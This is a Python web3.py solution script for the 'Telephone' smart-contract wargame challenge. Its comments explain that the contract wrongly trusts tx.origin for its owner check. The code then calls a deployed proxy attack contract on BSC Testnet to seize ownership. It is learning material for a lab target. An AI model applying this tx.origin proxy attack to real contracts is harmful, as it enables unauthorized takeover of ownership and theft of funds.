# The telephone contract is quite simple. We need to get its ownership and there is a 
# function to change the owner but it only accepts changing the owner if the tx.origin is
# different from the msg.sender. To do that we can use a smart contract as a proxy.


# Using web3.py library to make it easier building and signing transactions
# For this solution I had to use BSC Testnet as the hardhat local network was not able 
# to call functions between contracts.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions. This private key is from the local network
# it is public and not safe to use in a real blockchain
account = Account.from_key("") #TODO: Include operator PK
print(account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0)
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
w3Provider.eth.default_account = account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# Since this solution uses an attack contract you should set-up the attacking contract
# deployment. I chose to create a separated hardhat instance for that to keep all the 
# original scripts clean, the node and hardhat projects are already created in this folder:

# Getting ABI data from contracts builds and creating the contract object for easier
# contract methods calls. Please note that since this solution uses an attack contract
# you should deploy it first, and the contract address here should be of the attacking 
# contract
buildFile = open('artifacts/contracts/TelephoneAttack.sol/TelephoneAttack.json', "r")
build = json.loads(buildFile.read())
attackContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed attack contract address

# With our attacking smart contract set-up we just need to call the attacking transaction
transaction = attackContract.functions.proxyAttack().transact()
print(w3Provider.eth.wait_for_transaction_receipt(transaction))